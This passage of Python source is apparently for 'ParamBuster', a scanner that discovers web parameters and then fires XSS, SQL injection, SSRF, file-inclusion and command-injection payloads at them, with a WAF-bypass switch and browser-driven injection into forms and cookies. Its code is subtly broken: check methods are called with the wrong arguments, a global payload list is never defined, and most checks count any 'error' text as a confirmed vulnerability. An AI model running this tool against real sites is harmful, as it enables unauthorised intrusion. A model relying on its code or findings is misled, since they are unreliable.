                    headers["Content-Type"] = "application/json"
                    response = self.session.post(test_url, json=data, headers=headers, proxies=self.proxy, timeout=self.timeout)
                elif self.method == "POST":
                    response = self.session.post(test_url, data=data, headers=cached_headers, proxies=self.proxy, timeout=self.timeout)
                else:
                    response = self.session.get(test_url, headers=cached_headers, proxies=self.proxy, timeout=self.timeout)

                time.sleep(self.delay)

                with self.progress_lock:
                    self.processed_count += 1
                    if self.processed_count % 50 == 0:
                        self.log("INFO", f"Discovery Progress: {self.processed_count}/{total_params}")

                if response.status_code == 200:
                    similarity = SequenceMatcher(None, base_text, response.text).ratio()
                    diff = 1 - similarity
                    length_diff = abs(len(response.text) - base_length)
                    reflected = self.detect_reflection(response.text, unique_val)

                    # Wildcard filtering: If site reflects everything, 'reflected' isn't reliable for param detection alone
                    detect_criteria = False
                    if self.wildcard_reflected:
                        # Only trust significant diffs or unique reflection context change
                        detect_criteria = diff > self.stability_threshold or length_diff > self.stability_len_threshold
                    else:
                        detect_criteria = reflected or diff > self.stability_threshold or length_diff > self.stability_len_threshold

                    if detect_criteria:
                        src = hidden_params.get(param, "wordlist")
                        self.log("INFO", f"Found parameter: {Fore.CYAN}{param}{Style.RESET_ALL} ({src}) [Reflected: {reflected}]")
                        with threading.Lock():
                            self.parameters[param] = {
                                "status_code": 200,
                                "reflected": reflected,
                                "response_diff": diff,
                                "length_diff": length_diff,
                                "source": src,
                                "response_text": response.text if reflected else None
                            }
            except Exception as e:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_single_param, all_params_to_test)

        self.log("INFO", f"Detection complete. {len(self.parameters)} parameters identified.")


    def detect_reflection(self, response_text, unique_val):
        """Detects reflection in a meaningful context."""
        
        # Original checks
        # Check if the unique value is reflected within an HTML tag (e.g., <unique_val>, or <div id=unique_val>)
        # This is a good general check, but let's make it more specific for attributes too.
        if re.search(rf"<{re.escape(unique_val)}>", response_text, re.IGNORECASE):
            return True

        # Check if the unique value is reflected as a JavaScript variable (e.g., var x = 'unique_val';)
        if re.search(rf"var\s+\w+\s*=\s*['\"]{re.escape(unique_val)}['\"]", response_text):
            return True

        # --- Add more context-aware checks here ---

        # 1. Reflection in HTML attributes (e.g., <input value="unique_val">, <a href="unique_val">)
        # This is very common for XSS. Be careful to escape unique_val for regex.
        if re.search(rf'\w+=["\']?{re.escape(unique_val)}["\']?', response_text, re.IGNORECASE):
            return True
            
        # 2. Reflection within HTML content directly (e.g., <div>Hello unique_val!</div>)
        # This covers direct output without being inside a tag or attribute.
        if re.search(rf'(?:>|\s){re.escape(unique_val)}(?:<|\s)', response_text):
            return True

        # 3. Reflection within a URL path or query parameter (common in redirects or resource loading)
        # e.g., <img src="/images/unique_val.jpg"> or Location: /redirect?param=unique_val
        # This is tricky because unique_val might be URL-encoded.
        # For simplicity, we'll check for the raw string first.
        if re.search(rf'(?:href|src|action|location):?\s*["\']?[^"\']*?{re.escape(unique_val)}', response_text, re.IGNORECASE):
             return True

        # 4. Reflection within JavaScript string literals (e.g., alert('unique_val');)
        # This is a highly critical XSS vector.
        if re.search(rf"['\"]{re.escape(unique_val)}['\"]", response_text):
            # Exclude cases where it's already covered by variable assignment if that's preferred.
            # For now, let's include it as a distinct check.
            return True

        # 5. Reflection within JavaScript comments (less critical, but still a reflection)
        if re.search(rf"//.*?{re.escape(unique_val)}|/\*.*?{re.escape(unique_val)}.*?\*/", response_text, re.DOTALL):
            return True

        # 6. Reflection within JSON or XML data (e.g., API responses)
        # This assumes the response is being parsed as JSON/XML.
        # This is common for reflected content in API responses that might be processed client-side.
        if re.search(rf'["\']{re.escape(unique_val)}["\']\s*[,:\]}}]', response_text) or \
        re.search(rf'<{re.escape(unique_val)}>(.*?)</{re.escape(unique_val)}>', response_text, re.IGNORECASE):
            return True

        # 7. Reflection within server-side comments (less common but possible, e.g., ASP, PHP comments)
        if re.search(rf'<!--.*?{re.escape(unique_val)}.*?>', response_text, re.DOTALL) or \
           re.search(rf'/\*.*?{re.escape(unique_val)}.*?\*/', response_text, re.DOTALL): # For other language comments
            return True

        # 8. Reflection in hidden form fields (e.g., <input type="hidden" value="unique_val">)
        if re.search(rf'<input[^>]+type=["\']hidden["\'][^>]+value=["\']{re.escape(unique_val)}["\']', response_text, re.IGNORECASE):
            return True

        return False

    def analyze_sinks(self, response_text):
        """Analyze dangerous sinks in the response."""
        sinks = {
            "dangerous": [],
            "safe": []
        }
        dangerous_sinks = [
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=',
            r'href\s*=.*javascript:',
            r'src\s*=.*javascript:'
        ]
        for sink in dangerous_sinks:
            if re.search(sink, response_text, re.IGNORECASE | re.DOTALL):
                sinks["dangerous"].append(sink)
            else:
                sinks["safe"].append(sink)
        return sinks

    def highlight_reflections(self, response_text, unique_val):
        """Simulate highlighting reflections in CLI."""
        highlighted = response_text
        if unique_val in highlighted:
            highlighted = highlighted.replace(unique_val, f"{Back.YELLOW}{Fore.BLACK}{unique_val}{Style.RESET_ALL}")
        return highlighted

# Example usage (assuming the class structure)
# detector = VulnerabilityDetector()
# print(detector.detect_reflection("<html><body>Hello <script>var x = 'test1';</script></body></html>", "test1")) # True
# print(detector.detect_reflection("<div id=myid value=\"test2\"></div>", "test2")) # True
# print(detector.detect_reflection("<div><p>Reflected: test3</p></div>", "test3")) # True
# print(detector.detect_reflection("var data = \"test4\";", "test4")) # True (already covered, but good to double check)
# print(detector.detect_reflection("var data = 'test5'; // Unique_val here', "Unique_val")) # True
# print(detector.detect_reflection("{\"name\": \"test6\"}", "test6")) # True
    
    def scan_vulnerabilities(self, param):
        """Scan parameters with multi-threaded payload execution."""
        logger.debug(f"Deep scanning parameter: {param}")
        results = {}
        
        def test_payload(vuln_type, payload):
            if self.waf_bypass:
                payload = urllib.parse.quote(payload)
            
            test_url = f"{self.url}?{param}={payload}" if self.method == "GET" else self.url
            data = {param: payload} if self.method in ["POST", "JSON"] else None
            
            try:
                start_time = time.time()
                if self.method == "JSON":
                    headers = self.get_headers()
                    headers["Content-Type"] = "application/json"
                    response = self.session.post(test_url, json=data, headers=headers, proxies=self.proxy, timeout=self.timeout)
                elif self.method == "POST":
                    response = self.session.post(test_url, data=data, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
                else:
                    response = self.session.get(test_url, headers=self.get_headers(), proxies=self.proxy, timeout=self.timeout)
                
                elapsed = time.time() - start_time
                time.sleep(self.delay)

                vuln_result = self.check_vulnerability(response, vuln_type, payload, elapsed)
                if vuln_result["vulnerable"]:
                    with threading.Lock():
                        results[vuln_type] = {
                            "payload": payload,
                            "evidence": vuln_result["evidence"],
                            "severity": vuln_result["severity"]
                        }
                    self.log("SUCCESS", f"Confirmed {Fore.RED}{vuln_type.upper()}{Style.RESET_ALL} in {param} -> {payload}")
            except Exception as e:
                pass

        # Use partial payload list based on performance
        scan_payloads = []
        for vtype, payloads in self.vuln_payloads.items():
            limit = 20 if self.performance == "high" else 5
            for p in payloads[:limit]:
                scan_payloads.append((vtype, p))

        with ThreadPoolExecutor(max_workers=min(self.threads, 20)) as executor:
            for vtype, payload in scan_payloads:
                executor.submit(test_payload, vtype, payload)
        
        if results:
            with threading.Lock():
                self.vulnerabilities[param] = results

    def check_vulnerability(self, response, vuln_type, payload, elapsed):
        """Beastly vulnerability validation."""
        text = response.text.lower()
        headers = response.headers
        status = response.status_code
        
        result = {"vulnerable": False, "evidence": "", "severity": "Low"}
        
        if vuln_type == "xss":
            result["vulnerable"], result["evidence"] = self.check_xss(response, payload)
            if result["vulnerable"]:
                result["severity"] = "High"

        elif vuln_type == "sqli":
            result["vulnerable"], result["evidence"] = self.check_sqli(response, payload, elapsed)
            if result["vulnerable"]:
                result["severity"] = "Critical"

        elif vuln_type == "ssrf":
            result["vulnerable"], result["evidence"] = self.check_ssrf(response, payload, status)
            if result["vulnerable"]:
                result["severity"] = "High"

        elif vuln_type == "open_redirect":
            result["vulnerable"], result["evidence"] = self.check_open_redirect(response, payload, headers)
            if result["vulnerable"]:
                result["severity"] = "Medium"

        elif vuln_type == "idor":
            result["vulnerable"], result["evidence"] = self.check_idor(response, text)
            if result["vulnerable"]:
                result["severity"] = "High"

        elif vuln_type in ["path_traversal", "lfi"]:
            result["vulnerable"], result["evidence"] = self.check_file_inclusion(response, text)
            if result["vulnerable"]:
                result["severity"] = "Critical"

        elif vuln_type == "command_injection":
            result["vulnerable"], result["evidence"] = self.check_command_injection(response, payload, elapsed)
            if result["vulnerable"]:
                result["severity"] = "Critical"

        elif vuln_type == "rce":
            result["vulnerable"], result["evidence"] = self.check_rce(response, text)
            if result["vulnerable"]:
                result["severity"] = "Critical"

        return result

    def check_xss(self, response, payload):
        """Improved XSS detection using DOM parsing."""
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            # Check for script execution
            script_tags = soup.find_all('script')
            for script in script_tags:
                if payload in script.text:
                    return True, "Payload found in script tag"

            # Check for attribute injection
            tags_with_attributes = soup.find_all(attrs=True)
            for tag in tags_with_attributes:
                for attr_name, attr_value in tag.attrs.items():
                    if payload in attr_value:
                        return True, f"Payload found in attribute {attr_name}"
                    
                    

            return False, None
        except Exception as e:
            return False, f"Error during XSS analysis: {e}"

    def check_sqli(self, response, payload, elapsed):
        """Time-based SQLi detection."""
        if "sleep" in payload and elapsed > 5:  # Adjust threshold as needed
            return True, f"Time delay detected ({elapsed:.2f}s)"

        if "union" in payload or "select" in payload:
            # Check for UNION-based SQLi
            if "union" in response.text.lower() or "select" in response.text.lower():
                return True, "UNION-based SQLi detected"
        
        # Add other SQLi detection logic here (error-based, etc.)
        if any(err in response.text.lower() for err in ["error", "mysql", "sql", "exception"]) or response.status_code >= 400:
            return True, "SQL error or anomaly detected"
        return False, None
    


    def check_open_redirect(self, response, payload, headers):
        """Detects JavaScript-based open redirects."""
        if response.status_code in [301, 302, 303, 307, 308]:
            if "Location" in headers and (payload in headers["Location"] or "evil.com" in headers["Location"]):
                return True, f"Redirect to {headers['Location']}"
            
        # Check for JavaScript-based redirects
        if "javascript:" in payload or "window.location" in payload:
            if "Location" in headers and (payload in headers["Location"] or "evil.com" in headers["Location"]):
                return True, f"JavaScript redirect to {headers['Location']}"
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string:
                    # Look for window.location redirects
                    if re.search(r"window\.location\s*=\s*['\"]" + re.escape(payload), script.string):
                        return True, "JavaScript redirect found"
            return False, None
        except:
            return False, None


    def check_ssrf(self, response, payload, status):
        """Detects SSRF vulnerabilities."""
        # Check for internal IPs or localhost access

        if any(kw in payload for kw in ["localhost", "127.0.0.1", "169.254.169.254"]) and status in [200, 301, 302]:
            return True, "Internal resource access"

        if any(kw in payload for kw in ["file://", "ftp://", "gopher://", "dict://", "ldap://"]):
            return True, "File or protocol access attempt"

        if any(kw in payload for kw in ["http://", "https://", "ftp://", "gopher://", "dict://", "ldap://"]):
            return True, "External resource access attempt"

        if any(kw in payload for kw in ["aws", "azure", "google", "cloud", "metadata"]):
            return True, "Cloud metadata access attempt"

        if any(kw in payload for kw in ["internal", "private", "local"]):
            return True, "Internal resource access attempt"

        if any(ssrf in response.text for ssrf in vuln_payloads["ssrf"]):
            return True, "SSRF payload detected in response"
        return False, None

    def check_idor(self, response_text):
        """Detects Insecure Direct Object References (IDOR)."""
        for idor in vuln_payloads["idor"]:
            if idor in response_text:
                return True, f"IDOR payload detected: {idor}"
        if any(keyword in response_text for keyword in ["unauthorized", "permission", "forbidden"]) and "test" not in response_text:
            return True, "Access control bypass"
        if any(keyword in response_text for keyword in ["admin", "user", "profile", "account"]):
            return True, "Sensitive information exposure"

        if any(keyword in response_text for keyword in ["error", "exception", "not found"]):
            return True, "Potential IDOR error message"

        return False, None

    def check_file_inclusion(self, response_text):
        """Detects Path Traversal and LFI vulnerabilities."""
        if any(pt in response_text for pt in vuln_payloads["path_traversal"]):
            return True, "Path Traversal detected"
        
        if any(file in response_text for file in ["etc/passwd", "win.ini", "root", "proc"]):
            return True, "File content disclosure"
        
        if any(lfi in response_text for lfi in vuln_payloads["lfi"]):
            return True, "Local File Inclusion detected"
        
        if any(keyword in response_text for keyword in ["error", "exception", "failed"]):
            return True, "File inclusion error detected"
        
        if "file not found" in response_text or "no such file" in response_text:
            return True, "File inclusion error message"
        
        return False, None




    def check_command_injection(self, response, payload, elapsed):
        """Detects Command Injection vulnerabilities."""
        if any(cmd in response.text for cmd in ["whoami", "id", "dir", "ls"]):
            return True, "Command output detected"
        elif "ping" in payload and elapsed > 1:
            return True, f"Command execution delay ({elapsed:.2f}s)"
        
        elif any(cmd in response.text for cmd in ["bash", "sh", "powershell", "cmd.exe"]):
            return True, "Command execution detected"
        
        elif any(cmd in response.text for cmd in ["exec", "eval", "system", "shell_exec", "passthru"]):
            return True, "Command execution function detected"
        
        elif any(cmd in response.text for cmd in ["error", "exception", "failed"]):
            return True, "Command error detected"
        
        return False, None


    def check_rce(self, response_text):
        """Detects RCE vulnerabilities."""
        if any(code in response_text for code in ["whoami", "id", "eval(", "exec(", "system("]):
            return True, "Code execution detected"
        
        if any(rce in response_text for rce in vuln_payloads["rce"]):
            return True, "RCE payload detected"
        
        if any(keyword in response_text for keyword in ["error", "exception", "failed"]):
            return True, "RCE error detected"
        
        if "shell_exec" in response_text or "passthru" in response_text:
            return True, "Shell execution detected"
        
        if "Runtime.getRuntime().exec" in response_text:
            return True, "Java RCE detected"
        
        if "IEX(" in response_text or "Invoke-Expression" in response_text:
            return True, "PowerShell RCE detected"
        
        return False, None

    def active_testing_stub(self, param, payload):
        """Inject test payloads into forms and cookies to observe behavior."""
        if not self.browser_mode or not self.driver:
            self.log("WARNING", "Active testing requires browser mode")
            return

        try:
            self.driver.get(self.url)
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # Inject into forms
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                inputs = form.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    if inp.get_attribute("name") == param:
                        inp.clear()
                        inp.send_keys(payload)
                        self.log("INFO", f"Injected payload into form field: {param}")

            # Inject into cookies
            self.driver.add_cookie({"name": param, "value": payload})
            self.log("INFO", f"Injected payload into cookie: {param}")

            # Submit form if possible
            submit_buttons = self.driver.find_elements(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
            if submit_buttons:
                submit_buttons[0].click()
                time.sleep(2)  # Wait for response
                self.log("INFO", "Form submitted with injected payload")

        except Exception as e:
            self.log("ERROR", f"Active testing failed: {e}")

    def validate_parameters(self):
        """Powerful validation for critical parameters."""
        for param, info in self.parameters.items():
            if param in self.vulnerabilities:
                info["critical"] = True
                info["vulnerabilities"] = self.vulnerabilities[param]
            elif info.get("reflected", False) or info.get("response_diff", 0) > 0.05 or info.get("length_diff", 0) > 50:
                info["critical"] = "Potentially exploitable (reflection or significant change)"
            else:
                info["critical"] = False

    def print_summary(self):
        """Print parameter state summary."""
        if not self.parameters:
            print("\nNo parameters detected.")
            return

        print(f"\n[+] Found {len(self.parameters)} parameters:")
        print("=" * 60)

        for param, info in self.parameters.items():
            reflection = "Yes" if info.get("reflected") else "No"
            response_text = info.get("response_text", "")
            via = "head" if "<head>" in response_text else "body"
            sinks = self.analyze_sinks(response_text)
            dom_sink = "Yes" if sinks["dangerous"] else "No"
            dangerous_sink = dom_sink
            source = info.get("source", "unknown")

            print(f'Parameter: {param}')
            print(f'  Source: {source}')
            print(f'  Reflection: {reflection} (via {via})')
            print(f'  DOM Sink: {dom_sink}')
            print(f'  Dangerous Sink: {dangerous_sink}')
            print()

    def interactive_vuln_selection(self):
        """Interactive vulnerability type selection."""
        vuln_types = {
            "1": "xss",
            "2": "sqli",
            "3": "ssrf",
            "4": "open_redirect",
            "5": "idor",
            "6": "path_traversal",
            "7": "lfi",
            "8": "command_injection",
            "9": "rce"
        }

        print(f"\n[+] Found {len(self.parameters)} parameters to test for vulnerabilities")
        print("\nSelect vulnerability types to scan:")
        print("1. XSS (Cross-Site Scripting)")
        print("2. SQLi (SQL Injection)")
        print("3. SSRF (Server-Side Request Forgery)")
        print("4. Open Redirect")
        print("5. IDOR (Insecure Direct Object References)")
        print("6. Path Traversal")
        print("7. LFI (Local File Inclusion)")
        print("8. Command Injection")
        print("9. RCE (Remote Code Execution)")
        print("all. Scan all vulnerability types")
        print("skip. Skip vulnerability scanning")

        while True:
            try:
                choice = input("\nEnter your choice (e.g., 1,2,3 or 'all' or 'skip'): ").strip().lower()

                if choice == "skip":
                    return None
                elif choice == "all":
                    return list(vuln_types.values())
                else:
                    selections = [c.strip() for c in choice.split(",")]
                    selected_vulns = []

                    for sel in selections:
                        if sel in vuln_types:
                            selected_vulns.append(vuln_types[sel])
                        else:
                            print(f"Invalid choice: {sel}")
                            selected_vulns = []
                            break

                    if selected_vulns:
                        return selected_vulns
                    else:
                        print("Please enter valid choices.")

            except KeyboardInterrupt:
                print("\nSkipping vulnerability scanning...")
                return None
            except Exception as e:
                print(f"Error: {e}")

    def scan_selected_vulnerabilities(self, vuln_types):
        """Scan parameters for selected vulnerability types."""
        logger.info(f"Starting vulnerability scan for: {', '.join(vuln_types)}")

        if not self.parameters:
            logger.info("No parameters to scan for vulnerabilities.")
            return

        total_scans = len(self.parameters) * len(vuln_types)
        completed_scans = 0

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for param in self.parameters.keys():
                for vuln_type in vuln_types:
                    if vuln_type in self.vuln_payloads:
                        future = executor.submit(self.scan_single_vulnerability, param, vuln_type)
                        futures.append((future, param, vuln_type))

            for future, param, vuln_type in futures:
                try:
                    future.result()
                    completed_scans += 1
                    if completed_scans % 10 == 0:  # Progress update every 10 scans
                        logger.info(f"Completed {completed_scans}/{total_scans} vulnerability scans")
                except Exception as e:
                    logger.error(f"Error scanning {param} for {vuln_type}: {e}")

        logger.info(f"Vulnerability scanning completed. Scanned {completed_scans} parameter-vulnerability combinations")

    def scan_single_vulnerability(self, param, vuln_type):
        """Scan a single parameter for a specific vulnerability type."""
        results = {}

        for payload in self.vuln_payloads[vuln_type][:5]:  # Limit to 5 payloads per type
            if self.waf_bypass:
                payload = urllib.parse.quote(payload)

            test_url = f"{self.url}?{param}={payload}" if self.method == "GET" else self.url
            data = {param: payload} if self.method in ["POST", "JSON"] else None

            try:
                start_time = time.time()
                if self.method == "JSON":
                    headers = self.get_headers()
                    headers["Content-Type"] = "application/json"
                    response = self.session.post(test_url, json=data, headers=headers, proxies=self.proxy, timeout=10)
                elif self.method == "POST":
                    response = self.session.post(test_url, data=data, headers=self.get_headers(), proxies=self.proxy, timeout=10)
                else:
                    response = self.session.get(test_url, headers=self.get_headers(), proxies=self.proxy, timeout=10)
                elapsed = time.time() - start_time

                time.sleep(self.delay)

                vuln_result = self.check_vulnerability(response, vuln_type, payload, elapsed)
                if vuln_result["vulnerable"]:
                    results[vuln_type] = {
                        "payload": payload,
                        "evidence": vuln_result["evidence"],
                        "severity": vuln_result["severity"]
                    }
                    logger.info(f"Confirmed {vuln_type} vulnerability in {param} with payload: {payload} (Severity: {vuln_result['severity']})")
                    break  # Found vulnerability, no need to test more payloads

            except requests.RequestException as e:
                logger.debug(f"Vuln scan failed for {param} with {vuln_type} payload {payload}: {e}")

        if results:
            if param not in self.vulnerabilities:
                self.vulnerabilities[param] = {}
            self.vulnerabilities[param].update(results)

    def run(self, realtime=False, interval=60):
        """Run the tool with beastly execution."""
        self.start_time = time.time()
        print(START_BANNER)
        self.log("INFO", f"Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        try:
            if realtime:
                self._run_realtime(interval)
            else:
                self._run_once()
        finally:
            self._cleanup()
        return {"parameters": self.parameters, "vulnerabilities": self.vulnerabilities}

    def _cleanup(self):
        """Clean up resources."""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
        # Clear large data structures to free memory
        self.response_hashes.clear()

    def _run_once(self):
        """Single run execution."""
        self.detect_parameters()
        print(VULN_BANNER)

        if not self.parameters:
            self.log("INFO", f"No parameters detected to scan for vulnerabilities.")
        else:
            self.log("INFO", f"Starting vulnerability scan on {len(self.parameters)} parameters")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.scan_vulnerabilities, param) for param in self.parameters.keys()]
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        self.log("ERROR", f"Thread execution failed: {e}")

        self.validate_parameters()
        self.print_summary()
        self.log("INFO", f"Final validation complete")
        print(END_BANNER)

    def _run_realtime(self, interval):
        """Continuous real-time scanning."""
        self.log("INFO", f"Starting real-time scanning with {interval}s intervals")
        try:
            while True:
                self.parameters = {}
                self.vulnerabilities = {}
                self.request_count = 0
                self._run_once()
                self.log("INFO", f"Sleeping for {interval} seconds before next scan")
                time.sleep(interval)
        except KeyboardInterrupt:
            self.log("INFO", "Real-time scanning stopped by user")
            print(END_BANNER)

    def save_report(self, output_file, format="json"):
        """Save results to a file."""
        results = self.run()
        if format == "json":
            with open(output_file, "w") as f:
                json.dump(results, f, indent=4)
        elif format == "csv":
            with open(output_file, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Parameter", "Source", "Reflected", "Critical", "Vulnerabilities"])
                for param, info in results["parameters"].items():
                    vulns = "; ".join([f"{k}: {v['severity']}" for k, v in info.get("vulnerabilities", {}).items()])
                    writer.writerow([param, info.get("source", ""), info.get("reflected", False), info.get("critical", False), vulns])
        elif format == "html":
            html = "<html><body><h1>ParamBuster Report</h1>"
            html += "<h2>Detected Parameters</h2><ul>"
            for param, info in results["parameters"].items():
                html += f"<li>{param}: {json.dumps(info, indent=2)}</li>"
            html += "</ul><h2>Vulnerabilities</h2><ul>"
            for param, vulns in results["vulnerabilities"].items():
                html += f"<li>{param}: {json.dumps(vulns, indent=2)}</li>"
            html += "</ul></body></html>"
            with open(output_file, "w") as f:
                f.write(html)
        self.log("INFO", f"Report saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description="ParamBuster: High-Performance Parameter Detection and Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "JSON", "XML"], help="HTTP method")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("--performance", default="medium", choices=["low", "medium", "high"], help="Performance level")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-f", "--format", default="json", choices=["json", "csv", "html"], help="Output format")
    parser.add_argument("--waf-bypass", action="store_true", help="Enable WAF bypass techniques")
    parser.add_argument("--payload-dir", help="Directory containing custom payload files")
    parser.add_argument("--wordlist-dir", help="Directory containing wordlist files")
    parser.add_argument("--browser", action="store_true", help="Enable browser mode for enhanced extraction")
    parser.add_argument("--realtime", type=int, help="Enable real-time scanning with interval in seconds")
    parser.add_argument("--max-requests", type=int, default=1000, help="Maximum requests per scan")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--log-file", help="Log file path")

    args = parser.parse_args()

    # Setup logging
    global logger
    logger = setup_logging(verbose=args.verbose, log_file=args.log_file)

    tool = ParamBuster(
        url=args.url,
        method=args.method,
        threads=args.threads,
        performance=args.performance,
        delay=args.delay,
        proxy=args.proxy,
        waf_bypass=args.waf_bypass,
        max_requests=args.max_requests,
        payload_dir=args.payload_dir,
        wordlist_dir=args.wordlist_dir,
        browser_mode=args.browser
    )

    if args.browser:
        tool._init_browser()

    print(START_BANNER)
    logger.info(f"Scan started at {time.strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        tool.detect_parameters()
        tool.print_summary()

        if tool.parameters and not args.realtime:
            vuln_choice = tool.interactive_vuln_selection()
            if vuln_choice:
                print(VULN_BANNER)
                tool.scan_selected_vulnerabilities(vuln_choice)
                tool.validate_parameters()
                logger.info("Vulnerability scanning completed")

        print(END_BANNER)

        if args.output:
            tool.save_report(args.output, args.format)

    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        print(END_BANNER)
    except Exception as e:
        logger.error(f"Scan failed: {e}")
        print(END_BANNER)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Hunt interrupted by user.")